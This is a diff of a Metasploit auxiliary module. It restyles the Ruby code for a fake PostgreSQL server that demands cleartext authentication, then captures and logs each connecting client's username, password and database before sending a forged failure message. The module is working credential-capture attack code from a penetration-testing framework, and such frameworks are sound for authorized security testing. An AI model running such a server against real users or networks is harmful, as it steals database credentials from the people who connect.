@@ -9,21 +9,27 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'           => 'Authentication Capture: PostgreSQL',
-      'Description'    => %q{
+      'Name' => 'Authentication Capture: PostgreSQL',
+      'Description' => %q{
         This module provides a fake PostgreSQL service that is designed to
         capture clear-text authentication credentials.},
-      'Author'         => 'Dhiru Kholia <dhiru[at]openwall.com>',
-      'License'        => MSF_LICENSE,
-      'Actions'        => [[ 'Capture', 'Description' => 'Run PostgreSQL capture server' ]],
+      'Author' => 'Dhiru Kholia <dhiru[at]openwall.com>',
+      'License' => MSF_LICENSE,
+      'Actions' => [[ 'Capture', { 'Description' => 'Run PostgreSQL capture server' } ]],
       'PassiveActions' => [ 'Capture' ],
-      'DefaultAction'  => 'Capture'
+      'DefaultAction' => 'Capture',
+      'Notes' => {
+        'Stability' => [CRASH_SAFE],
+        'SideEffects' => [],
+        'Reliability' => []
+      }
     )
 
     register_options(
       [
-        OptPort.new('SRVPORT', [ true, "The local port to listen on.", 5432 ]),
-      ])
+        OptPort.new('SRVPORT', [ true, 'The local port to listen on.', 5432 ]),
+      ]
+    )
   end
 
   # This module is based on MySQL capture module by Patrik Karlsson.
@@ -35,7 +41,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run
-    exploit()
+    exploit
   end
 
   def report_cred(opts)
@@ -64,68 +70,68 @@ class MetasploitModule < Msf::Auxiliary
     create_credential_login(login_data)
   end
 
-  def on_client_connect(c)
-    @state[c] = {
-      :name    => "#{c.peerhost}:#{c.peerport}",
-      :ip      => c.peerhost,
-      :port    => c.peerport,
+  def on_client_connect(client)
+    @state[client] = {
+      name: "#{client.peerhost}:#{client.peerport}",
+      ip: client.peerhost,
+      port: client.peerport
     }
-    @state[c]["status"] = :init
+    @state[client]['status'] = :init
   end
 
-  def on_client_data(c)
-    data = c.get_once
-    return if not data
-    length = data.slice(0, 4).unpack("N")[0]
-    if length == 8 and @state[c]["status"] == :init
+  def on_client_data(client)
+    data = client.get_once
+    return if !data
+
+    length = data.slice(0, 4).unpack('N')[0]
+    if (length == 8) && (@state[client]['status'] == :init)
       # SSL request
-      c.put 'N'
-      @state[c]["status"] = :send_auth_type
-    elsif @state[c]["status"] == :send_auth_type
+      client.put 'N'
+      @state[client]['status'] = :send_auth_type
+    elsif @state[client]['status'] == :send_auth_type
       # Startup message
-      data.slice!(0, 4).unpack("N")[0] # skip over length
-      data.slice!(0, 4).unpack("N")[0] # skip over protocol
-      sdata = [ 0x52, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x03 ].pack("C*")
-      c.put sdata
+      data.slice!(0, 4).unpack('N')[0] # skip over length
+      data.slice!(0, 4).unpack('N')[0] # skip over protocol
+      sdata = [ 0x52, 0x00, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x03 ].pack('C*')
+      client.put sdata
       data.slice!(0, 5) # skip over "user\x00"
-      @state[c][:username] = data.slice!(0, data.index("\x00") + 1).unpack("Z*")[0]
+      @state[client][:username] = data.slice!(0, data.index("\x00") + 1).unpack('Z*')[0]
       data.slice!(0, 9) # skip over "database\x00"
-      @state[c][:database] = data.slice!(0, data.index("\x00") + 1).unpack("Z*")[0]
-      @state[c]["status"] = :pwn
-    elsif @state[c]["status"] == :pwn and data[0] == 'p'
+      @state[client][:database] = data.slice!(0, data.index("\x00") + 1).unpack('Z*')[0]
+      @state[client]['status'] = :pwn
+    elsif (@state[client]['status'] == :pwn) && (data[0] == 'p')
       # Password message
-      data.slice!(0, 5).unpack("N")[0] # skip over length
-      @state[c][:password] = data.slice!(0, data.index("\x00") + 1).unpack("Z*")[0]
+      data.slice!(0, 5).unpack('N')[0] # skip over length
+      @state[client][:password] = data.slice!(0, data.index("\x00") + 1).unpack('Z*')[0]
       report_cred(
-        ip: c.peerhost,
+        ip: client.peerhost,
         port: datastore['SRVPORT'],
         service_name: 'psql_client',
-        user: @state[c][:username],
-        password: @state[c][:password],
-        proof: @state[c][:database]
+        user: @state[client][:username],
+        password: @state[client][:password],
+        proof: @state[client][:database]
       )
-      print_good("PostgreSQL LOGIN #{@state[c][:name]} #{@state[c][:username]} / #{@state[c][:password]} / #{@state[c][:database]}")
+      print_good("PostgreSQL LOGIN #{@state[client][:name]} #{@state[client][:username]} / #{@state[client][:password]} / #{@state[client][:database]}")
       # send failure message
-      sdata = [ 0x45, 97 - 8 + @state[c][:username].length].pack("CN")
-      sdata << "SFATAL"
+      sdata = [ 0x45, 97 - 8 + @state[client][:username].length].pack('CN')
+      sdata << 'SFATAL'
       sdata << "\x00"
-      sdata << "C28P01"
+      sdata << 'C28P01'
       sdata << "\x00"
-      sdata << "Mpassword authentication failed for user \"#{@state[c][:username]}\""
+      sdata << "Mpassword authentication failed for user \"#{@state[client][:username]}\""
       sdata << "\x00"
-      sdata << "Fauth.c"
+      sdata << 'Fauth.c'
       sdata << "\x00"
-      sdata << "L302"
+      sdata << 'L302'
       sdata << "\x00"
-      sdata << "Rauth_failed"
+      sdata << 'Rauth_failed'
       sdata << "\x00\x00"
-      c.put sdata
-      c.close
+      client.put sdata
+      client.close
     end
-
   end
 
-  def on_client_close(c)
-    @state.delete(c)
+  def on_client_close(client)
+    @state.delete(client)
   end
 end
